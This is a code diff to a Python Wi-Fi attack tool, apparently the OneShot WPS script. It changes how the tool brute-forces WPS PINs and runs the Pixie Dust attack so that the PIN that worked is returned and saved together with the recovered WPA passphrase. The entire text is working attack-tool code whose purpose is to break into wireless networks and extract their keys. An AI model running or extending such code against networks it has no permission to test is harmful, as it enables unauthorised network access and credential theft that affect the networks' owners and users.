@@ -852,10 +852,13 @@ class Companion:
                 break
 
         self.sendOnly('WPS_CANCEL')
+        if self.connection_status.status == 'GOT_PSK':
+            return pin
         return False
 
     def single_connection(self, bssid=None, ssid=None, pins=None, pixiemode=False, pbc_mode=False, showpixiecmd=False,
                           pixieforce=False, store_pin_on_fail=False):
+        successPin = None
         if not pins:
             if pixiemode:
                 try:
@@ -876,25 +879,33 @@ class Companion:
                 # If not pixiemode, ask user to select a pin from the list
                 pins = self.__prompt_wpspin(bssid) or ['12345670']
         if pbc_mode:
-            self.__wps_connection(bssid, pbc_mode=pbc_mode)
+            sPin = self.__wps_connection(bssid, pbc_mode=pbc_mode)
             bssid = self.connection_status.bssid
             pins = ['<PBC mode>']
+            successPin = '<PBC mode>'
         elif store_pin_on_fail:
             try:
                 for pin in pins:
-                    self.__wps_connection(bssid, pin, pixiemode)
+                    sPin = self.__wps_connection(bssid, pin, pixiemode)
+                    if sPin:
+                        successPin = sPin
+                        break
+
             except KeyboardInterrupt:
                 print("\nAborting…")
                 self.__savePin(bssid, pins)
                 return False
         else:
             for pin in pins:
-                self.__wps_connection(bssid, pin, pixiemode)
+                sPin = self.__wps_connection(bssid, pin, pixiemode)
+                if sPin:
+                    successPin = sPin
+                    break
 
         if self.connection_status.status == 'GOT_PSK':
-            self.__credentialPrint(pin, self.connection_status.wpa_psk, self.connection_status.essid)
+            self.__credentialPrint(successPin, self.connection_status.wpa_psk, self.connection_status.essid)
             if self.save_result:
-                self.__saveResult(bssid, self.connection_status.essid, pin, self.connection_status.wpa_psk)
+                self.__saveResult(bssid, self.connection_status.essid, successPin, self.connection_status.wpa_psk)
             if not pbc_mode:
                 # Try to remove temporary PIN file
                 filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
@@ -907,7 +918,7 @@ class Companion:
             if self.pixie_creds.got_all():
                 pin = self.__runPixiewps(showpixiecmd, pixieforce)
                 if pin:
-                    return self.single_connection(bssid, pin, pixiemode=False, store_pin_on_fail=True)
+                    return self.single_connection(bssid, pins=[pin], pixiemode=False, store_pin_on_fail=True)
                 return False
             else:
                 print('[!] Not enough data to run Pixie Dust attack')
